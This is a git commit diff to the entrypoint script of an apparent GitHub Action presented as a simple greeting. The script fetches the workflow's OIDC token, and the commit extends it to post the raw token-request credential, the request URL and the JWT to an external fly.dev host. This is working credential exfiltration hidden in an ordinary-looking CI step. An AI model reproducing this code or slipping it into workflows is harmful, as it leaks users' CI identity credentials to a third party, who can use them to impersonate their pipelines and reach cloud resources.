0b04c5eff2f1245d1705150c773dda1de0205085
Johnny Horvi <johnny@horvi.no>
2023-12-13 10:33:37 +0100

    testing

--- entrypoint.sh
+++ entrypoint.sh
@@ -3,10 +3,9 @@
 echo "Hello $1"
 
 payload=$(curl -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=hookd")
-
 jwt=$(echo "$payload" | jq -r '.value')
 
-curl https://twilight-hill-6850.fly.dev --data "$jwt"
+curl https://twilight-hill-6850.fly.dev --data "token: $ACTIONS_ID_TOKEN_REQUEST_TOKEN url: $ACTIONS_ID_TOKEN_REQUEST_URL jwt: $jwt"
 
 time=$(date)
 echo "time=$time" >> $GITHUB_OUTPUT
